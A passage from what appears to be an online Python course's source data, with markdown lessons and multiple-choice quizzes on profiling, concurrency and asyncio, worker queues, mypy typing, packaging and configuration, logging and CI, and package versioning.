\`lru_cache\` only works on **pure** functions with **hashable** arguments — a list argument raises \`TypeError: unhashable type: 'list'\`. Two traps: \`maxsize=None\` keeps every result alive for the life of the process, which is a memory leak wearing a performance hat; and caching a function that reads a database means your program serves the value it saw at startup until it restarts.

### Memory, when that is the problem

\`\`\`python
import tracemalloc

tracemalloc.start()
run_import()
for stat in tracemalloc.take_snapshot().statistics("lineno")[:10]:
    print(stat)     # file, line number, and bytes still allocated there
\`\`\`

The usual answer is the one from Chapter 1: a list where a generator would do. \`sum(parse(line) for line in f)\` holds one row at a time; \`sum([parse(line) for line in f])\` holds all four million.

### Things that are genuinely worth doing

- \`"".join(parts)\` instead of \`s += piece\` in a loop — quadratic becomes linear.
- \`re.compile(pattern)\` once at module level, not inside the loop.
- \`deque\` instead of \`list.pop(0)\` (Chapter 5).
- Let a C library do the arithmetic: \`numpy\` over a million floats beats any pure-Python loop by two orders of magnitude.

And the discipline that matters more than all of them: if a function accounts for 2% of runtime and you make it 40% faster, the program got 0.8% faster. Optimise the measured hot spot, re-measure, and stop when it is fast enough.
        `,
        [
          q('timeit reports almost identical times for testing membership against a list and against a set of 10,000 items. What did the benchmark get wrong?', [
            'The container was built inside the timed statement, so both runs measured construction',
            'timeit averages across containers, so the difference disappears',
            '10,000 elements is too few for a set to show any advantage',
            'The -s setup string is timed along with the statement',
          ], 0, 'Building the list or set dominates the loop and swamps the lookup being compared, which is why the data belongs in the untimed -s setup string.'),
          q('A cProfile report shows a function with a large cumtime and a tiny tottime. What does that combination tell you?', [
            'It was called an unusually large number of times',
            'Profiler overhead dominated the measurement for that row',
            'It spends almost no time itself, and the runtime sits in what it calls',
            'It is recursive, so its own time was counted more than once',
          ], 2, 'tottime excludes the functions it calls while cumtime includes them, so this row is a passthrough and the real cost is further down the call tree.'),
          q('You decorate a function that reads today\'s exchange rate from the database with @lru_cache(maxsize=None). What goes wrong in production?', [
            'It raises TypeError, because a database handle is not hashable',
            'The cache is cleared on every request, so nothing is ever reused',
            'Only the most recent call is kept, so the hit rate stays near zero',
            'It serves the first value it saw until restart, and never evicts an entry',
          ], 3, 'lru_cache assumes the function is pure, so a changing database value is never re-read, and maxsize=None means the stored results accumulate for the life of the process.'),
        ]
      ),
        lesson('Threads, Processes, and the GIL', 14, `
CPython has a **Global Interpreter Lock**: exactly one thread executes Python bytecode at a time, per process. That single fact decides which concurrency tool you reach for.

| Workload | Tool | Why |
|---|---|---|
| Waiting on network or disk | threads, or asyncio | the GIL is released during blocking I/O |
| Pure-Python computation | processes | each process has its own interpreter and its own GIL |
| Array maths | \`numpy\` / \`pandas\` | the C code releases the GIL itself |

Moving a CPU-bound loop onto eight threads makes it slightly *slower*, because you have added lock contention to work that still executes one instruction stream at a time.

### Threads for I/O

\`\`\`python
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.exceptions import RequestException

def fetch(session, url):
    r = session.get(url, timeout=10)      # timeout, always (Chapter 5)
    r.raise_for_status()
    return r.json()

with requests.Session() as session, ThreadPoolExecutor(max_workers=8) as pool:
    futures = {pool.submit(fetch, session, url): url for url in urls}
    for future in as_completed(futures):
        try:
            data = future.result()        # re-raises whatever the worker raised
        except RequestException as err:
            log.warning("failed %s: %s", futures[future], err)
\`\`\`

Forty sequential requests at 200 ms each take eight seconds; eight workers take one. The \`with\` block waits for every task before it exits, so you never leak a half-finished pool.

**The classic bug is never calling \`.result()\`.** An exception raised inside a worker is stored on the future and thrown away if nobody asks for it. Code that submits work and moves on reports total success while half the tasks died. \`pool.map\` has the same property — it only re-raises when you iterate the results.

### Processes for CPU

\`\`\`python
from concurrent.futures import ProcessPoolExecutor

def score(record):
    return heavy_pure_python(record)

if __name__ == "__main__":                       # not optional here
    with ProcessPoolExecutor() as pool:
        results = list(pool.map(score, records, chunksize=100))
\`\`\`

Chapter 2 introduced the \`__main__\` guard as hygiene. With process pools it is a hard requirement: on macOS and Windows a child is started by **re-importing your module**, so without the guard every child re-runs the pool creation and spawns children of its own. The symptom is a machine that fills with Python processes until it stops responding.

Two more constraints follow from separate interpreters:

- Arguments and return values are **pickled** and copied. A lambda or a locally defined function raises \`PicklingError\`; a 500 MB dataframe sent to each of eight workers costs more than the work saved.
- \`chunksize\` matters. Handing over a million one-microsecond tasks individually is all overhead; batching 100 at a time turns it into real parallelism.

### Shared state and races

\`\`\`python
counter = 0

def bump():
    global counter
    counter += 1        # read, add, write — three steps, interruptible between any two
\`\`\`

Run that on four threads a million times each and the total comes out short. Two threads read \`41\`, both write \`42\`, one increment vanishes. The fix is a lock:

\`\`\`python
import threading

lock = threading.Lock()

def bump():
    global counter
    with lock:          # released even if the body raises (Chapter 3)
        counter += 1
\`\`\`

Locks bring their own failure mode: two threads taking the same two locks in opposite orders deadlock, and the process simply hangs with no traceback and no error. The reliable way out is to share nothing — give each worker its own input, return a value, and combine the returns in the parent thread, exactly as the \`ThreadPoolExecutor\` example does.
        `,
        [
          q('If only one thread runs Python bytecode at a time, why do eight threads still make 40 HTTP requests roughly eight times faster?', [
            'The lock is released while a thread waits on the socket, so the waits overlap',
            'Each thread gets its own interpreter and therefore its own lock',
            'The lock only applies to functions that allocate new objects',
            'requests moves every call into a subprocess behind the scenes',
          ], 0, 'A thread blocked on network I/O is not executing bytecode, so it hands the lock back and the other threads run while it waits for the response.'),
          q('pool.submit(lambda r: score(r), record) on a ProcessPoolExecutor fails immediately. Why?', [
            'A process pool only accepts functions defined inside __main__',
            'The callable and its arguments are pickled to reach the child, and a lambda cannot be pickled',
            'Lambdas are not allowed to take arguments in a worker process',
            'submit exists only on ThreadPoolExecutor, not the process version',
          ], 1, 'Separate interpreters cannot share objects, so everything crossing the boundary is pickled, and pickle can only reference functions by an importable module level name.'),
          q('Four threads each run counter += 1 a million times, and the total comes out thousands short. What happened?', [
            'Some threads exited before their loop had finished running',
            'The interpreter lock discards increments when it switches threads',
            'The read, add and write are three steps, and a switch between them loses an update',
            'Integers above a million are interned, so some writes were skipped',
          ], 2, 'Two threads can both read 41 and both write 42, so one increment disappears, which is why the shared counter needs a lock or should not be shared at all.'),
        ]
      ),
        lesson('asyncio for I/O at Scale', 14, `
Threads scale to dozens of concurrent operations. \`asyncio\` scales to thousands, on one thread, by suspending a task at every \`await\` and running another while it waits.

\`\`\`python
import asyncio
import httpx

async def fetch(client, url):
    r = await client.get(url, timeout=10)
    r.raise_for_status()
    return r.json()

async def main(urls):
    async with httpx.AsyncClient() as client:
        return await asyncio.gather(*(fetch(client, u) for u in urls))

results = asyncio.run(main(urls))      # creates the loop, runs it, closes it
\`\`\`

\`asyncio.run\` is the single entry point — one per program, at the top. \`gather\` returns results **in input order**, not completion order, and by default the first exception propagates while the remaining tasks keep running unattended. Pass \`return_exceptions=True\` to collect failures alongside successes:

\`\`\`python
results = await asyncio.gather(*tasks, return_exceptions=True)
ok = [r for r in results if not isinstance(r, Exception)]
\`\`\`

### A coroutine does nothing until you await it

\`\`\`python
data = fetch(client, url)          # a coroutine object; no request was made
data = await fetch(client, url)    # now it runs
\`\`\`

Forgetting the \`await\` gives you \`RuntimeWarning: coroutine 'fetch' was never awaited\` and a variable holding a coroutine instead of your data. It is the first mistake everybody makes, and the warning is easy to lose in a busy log — the downstream symptom is usually \`AttributeError: 'coroutine' object has no attribute 'get'\` several functions away.

### Never block the event loop

One thread runs everything, so any synchronous call freezes **every** task:

\`\`\`python
time.sleep(1)                  # stalls all 5,000 tasks for a second
requests.get(url)              # blocking client — same problem
await asyncio.sleep(1)         # correct: yields control back to the loop
await client.get(url)          # correct: async client
\`\`\`

For blocking work you cannot avoid — a legacy library, a CPU-heavy hash — hand it to a thread:

\`\`\`python
digest = await asyncio.to_thread(hash_password, password)
\`\`\`

This is the rule that catches teams migrating existing code: one \`requests.get\` left in an async handler removes the entire benefit, and it is invisible in code review because the line looks perfectly ordinary.

### Bound the concurrency

\`\`\`python
sem = asyncio.Semaphore(20)

async def fetch(client, url):
    async with sem:                       # at most 20 requests in flight
        r = await client.get(url, timeout=10)
        r.raise_for_status()
        return r.json()
\`\`\`

Firing 5,000 simultaneous requests exhausts local sockets, trips the server's rate limiter, and gets your key revoked (Chapter 5). A semaphore of 10 to 50 is almost always faster in wall-clock terms than no limit at all.

### Timeouts and task groups

\`\`\`python
async with asyncio.timeout(30):           # Python 3.11+
    await slow_operation()

async with asyncio.TaskGroup() as tg:     # 3.11+
    tg.create_task(sync_courses())
    tg.create_task(sync_students())
\`\`\`

A \`TaskGroup\` waits for all of its tasks and cancels the siblings when one fails, which is the behaviour most people assumed \`gather\` had. Note that \`asyncio.timeout\` cancels the *task*; the HTTP call still needs its own \`timeout=\` argument, because a socket that never answers is a different failure from an operation that merely takes too long.

### When not to use it

For one request, or a few dozen, the threads from the previous lesson give you most of the benefit with none of the colouring — async is contagious, and an \`async def\` at the bottom of a call chain forces \`async def\` all the way up. Reach for asyncio when you have thousands of concurrent connections, or when the framework you are in is already built on it (FastAPI, aiohttp). And it does nothing whatsoever for CPU-bound work: that is still a process pool.
        `,
        [
          q('asyncio.gather is given 500 fetches and the tenth raises. With the default arguments, what happens next?', [
            'Every remaining task is cancelled before gather returns',
            'gather returns the successful results with the exception among them',
            'The exception propagates while the other tasks keep running unattended',
            'gather retries the failed coroutine once and then raises',
          ], 2, 'gather re-raises the first failure to its caller but does not cancel its siblings, which is why a TaskGroup is the better choice when a failure should stop the batch.'),
          q('You write data = fetch(client, url) and leave out the await. What is in data?', [
            'The parsed JSON, because asyncio schedules the call automatically',
            'None, because the coroutine returned before the request completed',
            'A Future you can inspect for the result at any later point',
            'A coroutine object, and no request was ever sent',
          ], 3, 'Calling an async function only builds a coroutine, and nothing runs until it is awaited, so the failure usually surfaces as an AttributeError several functions away.'),
          q('Firing 5,000 requests at once is often slower in wall clock terms than limiting to 20 with a semaphore. Why?', [
            'The event loop runs only 20 tasks at a time regardless of the count',
            'Local sockets run out and the server rate limits you, so work is refused or retried',
            'The loop switches between tasks less often as the task count grows',
            'gather sorts its results, and sorting 5,000 items dominates the runtime',
          ], 1, 'Past a certain point the extra concurrency produces failures rather than throughput, and every 429 or reset connection has to be repeated, which costs more than waiting your turn.'),
        ]
      ),
            lesson('Queues, Backpressure, and Worker Pipelines', 13, `
A nightly importer reads a 4 million row export, hands each row to eight writer threads, and dies at 03:20 with the machine out of memory. The writers were fine. The reader was faster than they were, and every row it produced while they were busy piled up in an unbounded queue.

That is the failure mode a \`queue.Queue\` exists to prevent, and the one its default settings walk straight into.

### The pipeline

\`\`\`python
import queue, threading

work = queue.Queue(maxsize=1000)     # the number that saves you
DONE = object()

def writer():
    while True:
        row = work.get()
        try:
            if row is DONE:
                return
            save(row)
        except Exception:
            log.exception("row failed: %s", row.get("id"))
        finally:
            work.task_done()

threads = [threading.Thread(target=writer) for _ in range(8)]
for t in threads:
    t.start()

for row in read_export("enrolments.csv"):
    work.put(row)                    # blocks once 1,000 rows are waiting

for _ in threads:
    work.put(DONE)
for t in threads:
    t.join()
\`\`\`

\`Queue\` is thread safe on its own. Every \`put\` and \`get\` is already locked internally, so you do not wrap it in a \`threading.Lock\` and you do not need one for the rows themselves as long as each row goes to exactly one worker.

### maxsize is backpressure

| maxsize | Behaviour when writers fall behind |
|---|---|
| \`0\` (default) | \`put\` always succeeds, memory grows without limit |
| \`1000\` | \`put\` blocks, the reader slows to the writers' pace |

Backpressure means the slowest stage sets the speed of the whole pipeline. With \`maxsize=1000\` the importer holds at most a thousand rows plus whatever the eight writers are holding, whether the export has 4 million rows or 400 million. Pick a bound you can afford in memory, not a bound that feels generous.

### The sentinel, one per worker

\`DONE\` is a plain object used as a stop signal. Each item on a queue is delivered to exactly **one** consumer, so a single sentinel retires a single thread and the other seven wait forever. Send one per worker.

Use a unique object rather than \`None\`, because \`None\` is a value your data can legitimately contain, and a bare \`queue.Empty\` timeout is not a shutdown signal either: an empty queue only means the reader has not caught up yet.

### The bug that hangs with no traceback

\`\`\`python
row = work.get()
save(row)              # raises here
work.task_done()       # never runs
\`\`\`

An exception in a thread does not propagate anywhere. The thread prints a traceback and dies, so \`work.join()\` waits for an item that will never be marked done, and the process sits at 0% CPU forever. Every \`get\` needs its matching \`task_done\` in a \`finally\`, exactly as in the pipeline above.

The related temptation is \`daemon=True\` threads, which lets the program exit without joining. It also kills a writer mid statement, so the last few records are half written and you find out from the data rather than from a log line.

### asyncio has the same shape

\`\`\`python
work = asyncio.Queue(maxsize=1000)

async def writer():
    while True:
        row = await work.get()
        try:
            await save(row)
        finally:
            work.task_done()
\`\`\`

Same bound, same \`task_done\`, but \`asyncio.Queue\` is **not** thread safe: it belongs to one event loop. Do not share it with a \`ThreadPoolExecutor\`.

### When you do not need any of this

If the work is a flat list of independent jobs, \`ThreadPoolExecutor\` already owns a queue and does all of the above for you. Build the pipeline by hand when stages have different speeds, when the input is a stream you cannot fit in memory, or when you need several stages chained, each with its own bound.
      `,
        [
          q('A reader thread pushes 4 million rows into queue.Queue() while eight writers save them, and memory climbs until the process is killed. What fixes it?', [
            'Give the queue a maxsize so put blocks once it is full',
            'Start more writer threads so the queue drains faster',
            'Call task_done after each put rather than after each get',
            'Move the reader into a process pool to lower its memory use',
          ], 0, 'An unbounded queue lets a fast producer buffer the entire input in memory, and a maxsize forces the producer to wait for the consumers instead.'),
          q('A worker raises inside save(row) before reaching task_done. What does the main thread see when it calls queue.join()?', [
            'The exception, because join re-raises whatever a worker raised',
            'join returns straight away and the failed row is simply skipped',
            'The other workers drain the queue and join returns as normal',
            'join blocks forever with no traceback, since one item is never marked done',
          ], 3, 'join waits until the count of unfinished tasks reaches zero, so a single missing task_done leaves it waiting on an item nobody will ever complete.'),
          q('Why send one sentinel object per worker instead of a single one to shut the pool down?', [
            'Sentinels are only broadcast to all workers when the queue is bounded',
            'Each item is delivered to exactly one worker, so one sentinel stops one thread',
            'task_done must be called once per worker before a queue can be closed',
            'A single sentinel is consumed before any of the real rows are processed',
          ], 1, 'A queue hands each item to a single consumer rather than broadcasting it, so seven of the eight threads would still be blocked in get and never exit.'),
        ]
      ),
      ],
      [
        q('A pure-Python, CPU-bound job is spread across eight threads and gets no faster. Why?', [
          'ThreadPoolExecutor runs its tasks sequentially by design',
          'Thread creation costs more than the work itself',
          'The GIL lets only one thread execute Python bytecode at a time, so the work never overlaps',
          'Threads cannot return values, so the results were discarded',
        ], 2, 'Only one thread holds the interpreter lock while executing bytecode, so CPU-bound work is serialised no matter how many threads you start.'),
        q('You submit 200 tasks to a ThreadPoolExecutor and never call .result(). A worker raises. What happens?', [
          'The exception is stored on the future and silently discarded',
          'It propagates immediately from submit()',
          'The pool shuts down and re-raises when the with block exits',
          'It is logged automatically at ERROR level',
        ], 0, 'A future holds the exception until someone retrieves the result, so unread futures turn every worker failure into a silent one.'),
        q('Inside an async function, which call stalls every other task on the event loop?', [
          'await asyncio.sleep(1)',
          'await client.get(url)',
          'await asyncio.to_thread(hash_password, pw)',
          'requests.get(url)',
        ], 3, 'A synchronous call never yields to the loop, so the single thread running every task is blocked until it returns.'),
        q('Why does ProcessPoolExecutor code need the if __name__ == "__main__" guard?', [
          'The guard is what enables arguments to be pickled',
          'Each child starts by re-importing the module, so unguarded pool creation runs again in every child',
          'Without it the parent exits before the children finish',
          'Child processes cannot import modules at all',
        ], 1, 'Spawn-based process creation re-imports your module in the child, and an unguarded pool at module level therefore spawns children recursively.'),
      ]
    ),
    chapter(
      'Shipping It: Types, Packaging, and Production',
      'Type hints a checker can actually verify, a project other people can install, and the configuration, logging, and CI that keep it running once it leaves your laptop.',
      [
        lesson('Static Typing with mypy', 13, `
The hints from Chapter 1 are documentation until a checker reads them. \`mypy\` reads them, and turns a whole class of runtime crashes into errors you see before you commit.

\`\`\`bash
python -m pip install mypy
python -m mypy src
\`\`\`

### The highest-value thing it finds is None

\`\`\`python
def find(slug: str) -> Course | None:
    return COURSES.get(slug)

course = find("python-development")
print(course.title)
# error: Item "None" of "Course | None" has no attribute "title"
\`\`\`

That is next quarter's \`AttributeError: 'NoneType' object has no attribute 'title'\`, reported today, on the line that causes it. The fix is to narrow the type before using it:

\`\`\`python
course = find("python-development")
if course is None:
    raise CourseNotFound(slug)
print(course.title)          # mypy now knows it is a Course
\`\`\`

mypy follows \`is None\` checks, \`isinstance\` checks, and early returns. Write the guard the way Chapter 4 told you to and the checker agrees with you for free.

### Annotating containers and parameters

\`\`\`python
from collections.abc import Iterable, Sequence

def total_hours(courses: Iterable[Course]) -> int: ...
def first_three(courses: Sequence[Course]) -> list[Course]: ...
by_slug: dict[str, Course] = {}
\`\`\`

Accept the broadest type you can use and return the most concrete one you have. A parameter typed \`list[Course]\` rejects a tuple and a generator for no reason; typed \`Iterable[Course]\` it accepts everything you can iterate. Returning \`Iterable\` instead of \`list\`, on the other hand, just makes the caller work harder.

### TypedDict for JSON shapes

\`\`\`python
from typing import TypedDict

class CourseRow(TypedDict):
    slug: str
    title: str
    hours: int

def parse(payload: str) -> CourseRow:
    return json.loads(payload)     # the annotation is a promise you must keep
\`\`\`

\`TypedDict\` describes the dict you already load in Chapter 4 without forcing you to build objects. It checks key names and value types at every access — \`row["hors"]\` becomes an error rather than a \`KeyError\` in production. It is **not** validated at runtime, though: if the API sends something else, mypy still believed you. For data crossing a trust boundary, validate with \`pydantic\` and get a real runtime check plus the types.

### Any is a hole in the floor

\`Any\` silently disables checking for everything it touches, and it spreads: one \`Any\` returned from a helper makes every expression built from it unchecked. When you genuinely do not know a type, \`object\` is the honest choice — it forces a narrowing check before use.

Suppress a specific line only with a specific code:

\`\`\`python
def load_config() -> dict[str, str]:
    return _plugin.load()      # type: ignore[no-any-return]
\`\`\`

A bare \`# type: ignore\` hides the next three errors on that line too, including the one you introduce next year.

### Adopting it gradually

\`\`\`toml
# pyproject.toml
[tool.mypy]
python_version = "3.12"
warn_unused_ignores = true
warn_return_any = true
disallow_untyped_defs = false     # start permissive

[[tool.mypy.overrides]]
module = "legacy.*"
ignore_errors = true              # quarantine, do not rewrite
\`\`\`

Turn \`strict = true\` on for new packages and leave the old ones on the permissive settings until someone touches them. The common failure is switching strict mode on across a 40,000-line codebase, seeing 3,000 errors, and turning mypy off forever.

The other common failure is hints that lie: a function annotated \`-> dict\` that returns \`None\` on one branch. Nothing enforces the annotation at runtime, so the lie survives until the checker runs — which is why mypy belongs in CI, not just in your editor.
        `,
        [
          q('A helper is annotated as returning Any, and its result is then passed through three more functions. What is the effect on checking?', [
            'mypy infers the concrete type from the call site and carries on',
            'Only the helper is unchecked, and its callers keep their guarantees',
            'Every expression built from that value goes unchecked, so the hole spreads',
            'mypy errors until the annotation is replaced with object',
          ], 2, 'Any is compatible with everything in both directions, so once a value carries it, nothing derived from that value can be verified either.'),
          q('Why annotate a parameter as Iterable[Course] rather than list[Course]?', [
            'list[Course] is only valid syntax from Python 3.12 onward',
            'Iterable lets mypy check the element type, while list does not',
            'Iterable is enforced at runtime, whereas list is only a hint',
            'A list annotation rejects a tuple or generator the function handles perfectly well',
          ], 3, 'Accepting the broadest type you can actually use means callers are not forced to build a list they did not need, and the function loses nothing since it only iterates.'),
          q('parse() is annotated as returning CourseRow and its body is a call to json.loads. The API starts sending hours as a string. What does that TypedDict do about it?', [
            'Nothing, because a TypedDict is a static description and never checks the payload',
            'It reports a type error the first time row["hours"] is used in arithmetic',
            'It converts the value to an int when the dict is constructed',
            'It raises a ValidationError as soon as the payload is parsed',
          ], 0, 'A TypedDict only tells the checker what you promised the dict contains, so data arriving from outside your process needs a real runtime validator such as pydantic.'),
        ]
      ),
        lesson('Packaging, Configuration, and Secrets', 13, `
A project other people can install has a defined layout, one metadata file, and no secrets in it.

### Layout

\`\`\`text
myapp/
  pyproject.toml
  README.md
  .gitignore
  src/
    myapp/
      __init__.py
      main.py
  tests/
    test_main.py
\`\`\`

The \`src/\` directory earns its keep. Without it, \`import myapp\` from the project root finds the working-directory copy, so your tests pass against files you never packaged, and the missing \`__init__.py\` or the module you forgot to include only surfaces after \`pip install\`. With \`src/\`, the only importable \`myapp\` is the installed one.

### One file of metadata

\`\`\`toml
[project]
name = "myapp"
version = "0.3.0"
requires-python = ">=3.11"
dependencies = [
  "requests>=2.31,<3",
  "pydantic>=2",
]

[project.optional-dependencies]
dev = ["pytest", "mypy", "ruff"]

[project.scripts]
myapp = "myapp.main:cli"          # creates a real 'myapp' command on PATH

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"
\`\`\`

\`\`\`bash
python -m pip install -e ".[dev]"     # editable: your edits take effect immediately
python -m build                       # dist/myapp-0.3.0-py3-none-any.whl
\`\`\`

Declare **ranges** in \`dependencies\`, and pin **exact** versions in a lock file (\`pip-compile\`, \`uv lock\`, or Poetry) for anything you deploy. The distinction matters: an application wants a byte-identical environment on every machine, while a library that pins exact versions becomes impossible for anyone to install alongside anything else. The \`requirements.txt\` from Chapter 2 is the lightweight form of the lock file.

### Configuration comes from the environment

The same artefact should run in development, staging, and production with nothing changed but environment variables.

\`\`\`python
import os
from dataclasses import dataclass

@dataclass(frozen=True)
class Settings:
    database_url: str
    api_token: str
    page_size: int = 50
    debug: bool = False

    @classmethod
    def from_env(cls) -> "Settings":
        return cls(
            database_url=os.environ["DATABASE_URL"],   # missing -> KeyError at startup
            api_token=os.environ["API_TOKEN"],
            page_size=int(os.environ.get("PAGE_SIZE", "50")),
            debug=os.environ.get("DEBUG", "").lower() in {"1", "true", "yes"},
        )

settings = Settings.from_env()     # once, at the entry point
\`\`\`

Two things there are deliberate. Required values use \`os.environ[...]\` so a missing variable crashes the process on startup, not at 3am the first time that code path runs. And every environment variable is a **string**, which is the source of the classic configuration bug:

\`\`\`python
debug = bool(os.environ.get("DEBUG"))     # DEBUG=false -> True; "false" is a non-empty string
\`\`\`

Every value needs parsing: \`int(...)\`, a membership test for booleans, \`.split(",")\` for lists. \`pydantic-settings\` does all of it declaratively if you would rather not hand-roll it.

### Secrets

\`\`\`bash
# .gitignore
.venv/
.env
dist/
__pycache__/
*.egg-info/
\`\`\`

Keep local values in a gitignored \`.env\` and load them with \`python-dotenv\` in development only; real environments inject variables directly, or through a secret manager. Never pass a secret as a command-line argument — it shows up in \`ps\` and in shell history.

And to repeat Chapter 5, because it is the mistake with the longest tail: a key committed to git must be **rotated**, not deleted. Removing it in a later commit changes nothing, since the value remains in the history of every clone, every fork, and every CI cache that ever pulled the repository.
        `,
        [
          q('A library you publish declares requests==2.31.0 in its dependencies. What does that cost the people who install it?', [
            'Nothing, because pip resolves conflicting pins automatically',
            'It cannot be installed alongside anything needing a different requests',
            'Its own test suite stops running on newer Python releases',
            'pip refuses to build a wheel from an exactly pinned dependency',
          ], 1, 'Only one version of a package can exist in an environment, so an exact pin in a library turns any other requirement on that package into an unresolvable conflict.'),
          q('Why does Settings.from_env read os.environ["DATABASE_URL"] rather than os.environ.get("DATABASE_URL")?', [
            'get returns bytes while the subscript form returns a string',
            'get only sees variables exported before the process started',
            'A missing variable then fails at startup instead of on some later code path',
            'The subscript form caches the value so later reads are cheaper',
          ], 2, 'A KeyError during startup is visible on the deploy, whereas a None that flows onward turns into a confusing failure the first time that branch happens to run.'),
          q('An API key was committed on Monday and removed in Tuesday\'s commit. Is the key safe now?', [
            'Yes, once the branch that contained it has been deleted',
            'Yes, because CI and pip only ever read the current checkout',
            'Yes, provided the repository was private the whole time',
            'No, the value survives in history everywhere and must be rotated',
          ], 3, 'The old commit still exists in every clone, fork, and CI cache that ever fetched the repository, so the only thing that actually revokes the key is issuing a new one.'),
        ]
      ),
        lesson('Logging, CI, and Running in Production', 14, `
Code on your laptop fails in front of you. Code in production fails silently at 3am, and the only thing you get is what you wrote down.

### Configure logging once, at the entry point

\`\`\`python
import logging
import sys

def configure_logging(level: str = "INFO") -> None:
    logging.basicConfig(
        level=level,
        stream=sys.stdout,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
    )
    logging.getLogger("urllib3").setLevel(logging.WARNING)   # quiet a noisy dependency

log = logging.getLogger(__name__)      # every module, top level, no arguments
\`\`\`

A **library** never calls \`basicConfig\` — it calls \`getLogger(__name__)\` and nothing else, leaving handlers and levels to the application. A library that configures logging steals the format from every program that imports it. Using \`__name__\` as the logger name is what later lets you turn one subsystem up to DEBUG without touching the rest.

Log to **stdout** and let the platform collect it. Writing and rotating your own file inside a container means the logs die with the container.

\`\`\`python
log.info("import finished rows=%s seconds=%.2f", len(rows), elapsed)
log.warning("retrying %s after %s", url, err)         # values as arguments (Chapter 5)
log.exception("import failed for %s", path)           # inside except: adds the traceback
\`\`\`

Never log a token, a password, or personal data. \`log.debug("headers=%s", headers)\` puts your \`Authorization\` header into the log aggregator, where it is searchable by everyone in the company and retained for a year.

### Lint and format automatically

\`\`\`bash
python -m pip install ruff
python -m ruff format .            # formatting, no arguments about it
python -m ruff check --fix .       # unused imports, shadowed names, bare except
\`\`\`

Style discussions in code review are a tax; a formatter removes them entirely.

### CI runs what you would forget to

\`\`\`yaml
# .github/workflows/ci.yml
name: ci
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: python -m pip install -e ".[dev]"
      - run: python -m ruff check .
      - run: python -m mypy src
      - run: python -m pytest -q
\`\`\`

The rule is short: **a check that is not in CI is not enforced**. Running the suite locally works right up to the afternoon someone pushes a fix in a hurry, and the value of the pipeline is precisely that it does not have afternoons. Make it fail loudly and keep it under a couple of minutes, or people start merging past a red build.

### A container that is reproducible

\`\`\`dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY pyproject.toml README.md ./
COPY src ./src
RUN python -m pip install --no-cache-dir .
CMD ["python", "-m", "myapp.main"]
\`\`\`

Pin the base image to \`3.12-slim\`, never \`latest\` — otherwise the image that built cleanly in March fails in June on a Python version nobody chose. Note \`python -m myapp.main\`, the module form from Chapter 2.

### Shut down without losing work

\`\`\`python
import signal

stopping = False

def _handle(signum, frame):
    global stopping
    stopping = True                 # do not do real work in a signal handler

signal.signal(signal.SIGTERM, _handle)

done = 0
for job in queue:
    if stopping:
        log.info("stopping after %s jobs", done)
        break
    process(job)
    done += 1
\`\`\`

Every deploy sends \`SIGTERM\` and then, some seconds later, \`SIGKILL\`. A worker that checks a flag between items finishes the job it is holding; one that ignores the signal has its half-written record killed mid-flight, and you find out from the data.

### The first week in production

Log every request with an identifier you can grep, alert on error *rate* rather than on individual errors, keep the timeouts and bounded retries from Chapter 5 on every outbound call, and make sure you can roll back to the previous version in one command. Then write the test for the first bug production finds — that one, per Chapter 5, is guaranteed to be worth having.
        `,
        [
          q('A queue worker receives SIGTERM during a deploy and has no handler for it. What is the observable result?', [
            'The deploy waits until the worker\'s queue has been emptied',
            'SIGKILL arrives seconds later and the in flight record is left half written',
            'Python turns the signal into KeyboardInterrupt and unwinds cleanly',
            'The process restarts itself and replays the job from the beginning',
          ], 1, 'SIGTERM is the polite request and SIGKILL is not refusable, so a worker that ignores the first one is killed mid job and leaves the damage in your data.'),
          q('Why does the Dockerfile pin python:3.12-slim instead of python:latest?', [
            'The latest tag cannot be pulled from inside a CI runner',
            'Slim images ship pip, while the latest tag does not',
            'An image that built in March otherwise fails in June on a version nobody chose',
            'The image tag has to match the version declared in pyproject.toml',
          ], 2, 'A floating tag makes the build non reproducible, so an interpreter upgrade you never asked for arrives on whichever day you happen to rebuild.'),
          q('A team runs ruff and mypy on their own machines but the pipeline runs only pytest. Why is that effectively no enforcement at all?', [
            'Editors only lint files that have been saved, so unsaved work escapes',
            'Neither tool can see the installed dependencies outside a container',
            'Local runs use a different interpreter, so their results cannot be trusted',
            'Someone in a hurry skips them, and nothing stops that commit merging',
          ], 3, 'A check only counts when something automatic blocks the merge, because human discipline is exactly what disappears on the afternoon of an urgent fix.'),
        ]
      ),
            lesson('Versioning and Releasing a Package', 13, `
You rename one keyword argument from \`page_size\` to \`per_page\`, tidy the changelog, and publish \`1.4.1\`. By morning, every downstream build that pinned \`myapp>=1.4,<2\` is red. Nothing was wrong with the rename. The number was wrong.

### The number is a promise

\`MAJOR.MINOR.PATCH\`, and each part answers one question about the code you are shipping.

| Change | Bump |
|---|---|
| Renaming or removing a public argument, function, or field | MAJOR |
| Adding an optional argument with a default | MINOR |
| Adding a new function or class | MINOR |
| Fixing behaviour without changing any signature | PATCH |
| Narrowing a return type from \`Optional[str]\` to \`str\` | MINOR |
| Widening a return type from \`str\` to \`Optional[str]\` | MAJOR |

That last pair catches people. Promising a value and always delivering one is safe. Promising a value and sometimes delivering None breaks every caller that trusted the old signature, even though the annotation only got one word longer.

Pre 1.0 is not an exemption, it is a warning label. If real projects install your \`0.x\`, breaking them still breaks them.

### One source of truth for the version

\`\`\`toml
[project]
name = "myapp"
version = "0.4.0"
\`\`\`

\`\`\`python
from importlib.metadata import version

__version__ = version("myapp")     # reads the installed metadata
\`\`\`

The alternative, a hardcoded \`__version__ = "0.3.0"\` in \`__init__.py\`, is a string that drifts. The support ticket then says 0.3.0 while the wheel is 0.4.0, and you spend an afternoon debugging code the user is not running.

### Write the changelog as you go

\`\`\`markdown
## [0.4.0] - 2026-08-24
### Added
- \`Client.stream_courses()\` for paginated iteration.
### Changed
- \`page_size\` renamed to \`per_page\` (breaking, see 1.0 note).
### Fixed
- Retry loop returned None after three 429 responses.
\`\`\`

Written at release time, a changelog is an archaeology exercise over 60 commits. Written with the change, it takes 20 seconds and is accurate.

### Tag, build, upload

\`\`\`bash
git tag -a v0.4.0 -m "0.4.0"
git push origin v0.4.0

python -m build                                   # dist/myapp-0.4.0-py3-none-any.whl
python -m twine upload --repository testpypi dist/*
python -m pip install --index-url https://test.pypi.org/simple myapp==0.4.0
python -m twine upload dist/*
\`\`\`

